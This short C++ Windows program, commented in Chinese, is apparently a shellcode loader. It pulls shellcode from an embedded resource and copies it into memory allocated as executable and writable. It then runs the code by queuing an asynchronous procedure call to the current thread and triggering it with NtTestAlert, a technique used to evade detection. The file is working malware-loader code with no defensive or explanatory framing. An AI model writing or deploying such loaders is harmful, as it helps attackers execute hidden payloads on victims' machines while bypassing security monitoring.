#include"..\public.hpp"
//#pragma comment(lib, "ntdll")
using pNtTestAlert = NTSTATUS(NTAPI*)();



int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.获取shellcode
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.分配shellcode空间
	LPVOID Memory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, shellcodeSize);
	//3.执行shellcode
	pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)Memory;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	NtTestAlert();
	return 0;
}